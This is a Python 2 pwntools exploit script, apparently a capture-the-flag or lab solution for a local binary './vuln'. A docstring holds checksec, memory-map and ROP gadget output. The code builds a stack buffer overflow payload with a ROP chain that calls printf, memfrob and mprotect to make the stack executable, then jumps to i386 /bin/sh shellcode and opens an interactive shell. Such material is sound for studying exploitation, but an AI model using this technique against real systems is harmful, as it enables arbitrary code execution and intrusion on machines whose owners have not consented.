#!/usr/bin/env python2.7
# coding: UTF-8

'''
$ checksec.sh --file ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   ./vuln

$ ldd ./vuln
    linux-gate.so.1 =>  (0xf7791000)
    libc.so.6 => /lib32/libc.so.6 (0xf75cc000)
    /lib/ld-linux.so.2 (0x56642000)

$ ./vuln &pmap $!
[5] 18576
18576:   ./vuln
0000000008048000      4K r-x-- vuln
0000000008049000      4K r---- vuln
000000000804a000      4K rw--- vuln
00000000f7e14000      4K rw---   [ anon ]
00000000f7e15000   1684K r-x-- libc-2.19.so
00000000f7fba000      8K r---- libc-2.19.so
00000000f7fbc000      4K rw--- libc-2.19.so
00000000f7fbd000     16K rw---   [ anon ]
00000000f7fd5000     12K rw---   [ anon ]
00000000f7fd8000      8K r----   [ anon ]
00000000f7fda000      8K r-x--   [ anon ]
00000000f7fdc000    128K r-x-- ld-2.19.so
00000000f7ffc000      4K r---- ld-2.19.so
00000000f7ffd000      4K rw--- ld-2.19.so
00000000fffdd000    132K rw---   [ stack ]
 total             2024K

$ i proc map
process 16384
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    0xf7e14000 0xf7e15000     0x1000        0x0 
    0xf7e15000 0xf7fba000   0x1a5000        0x0 /lib32/libc-2.19.so
    0xf7fba000 0xf7fbc000     0x2000   0x1a5000 /lib32/libc-2.19.so
    0xf7fbc000 0xf7fbd000     0x1000   0x1a7000 /lib32/libc-2.19.so
    0xf7fbd000 0xf7fc1000     0x4000        0x0 
    0xf7fd7000 0xf7fd8000     0x1000        0x0 
    0xf7fd8000 0xf7fda000     0x2000        0x0 [vvar]
    0xf7fda000 0xf7fdc000     0x2000        0x0 [vdso]
    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.19.so
    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.19.so
    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.19.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]

$ x/s 0xf7e15000
0xf7e15000: "\177ELF\001\001\001"

$ rp-lin-x86 --file=/lib32/libc.so.6 --rop=1 --unique|grep 'pop edi'
0x0001749a: pop edi ; ret  ;  (814 found)
'''

from pwn import *

r = process('./vuln')

libc = ELF('/lib32/libc-2.19.so')

libc_base = 0xf7e15000
libc_printf = libc_base + libc.symbols['printf']
libc_memfrob = libc_base + libc.symbols['memfrob']
libc_mprotect = libc_base + libc.symbols['mprotect']

print hex(libc.symbols['printf'])
print hex(libc.symbols['memfrob'])
print hex(libc.symbols['mprotect'])

addr_binsh = libc_base + next(libc.search('/bin/sh\0'))
addr_popedi = libc_base + 0x0001749a # 0x0001749a: pop edi ; ret  ;  (814 found)
addr_popecxpopeax = libc_base + 0x000ed610 # 0x000ed610: pop ecx ; pop eax ; ret  ;  (2 found)
addr_popebxpopesipopedi = libc_base + 0x00017498 # 0x00017498: pop ebx ; pop esi ; pop edi ; ret  ;  (290 found)
addr_jmpesp = libc_base + 0x00002a85 # 0x00002a85: jmp esp ;

addr_buf = 0xffffcecc
shellcode = asm(shellcraft.i386.linux.sh())

payload = 'a' * 112
payload += p32(libc_printf)
payload += p32(addr_popedi)
payload += p32(addr_buf + len(payload) + (4*11) + len(shellcode))
payload += p32(libc_memfrob)
payload += p32(addr_popecxpopeax)
payload += p32(addr_buf + len(payload) + (4*4))
payload += p32(addr_buf + len(payload))
payload += p32(libc_mprotect)
payload += p32(addr_popebxpopesipopedi)
payload += p32(0xfffdd000 ^ 0x2a2a2a2a)
payload += p32(0x21000 ^ 0x2a2a2a2a)
payload += p32(7 ^ 0x2a2a2a2a)
payload += p32(addr_jmpesp)
payload += shellcode
payload += '%12c%4$n'

r.sendline(payload)
r.interactive()
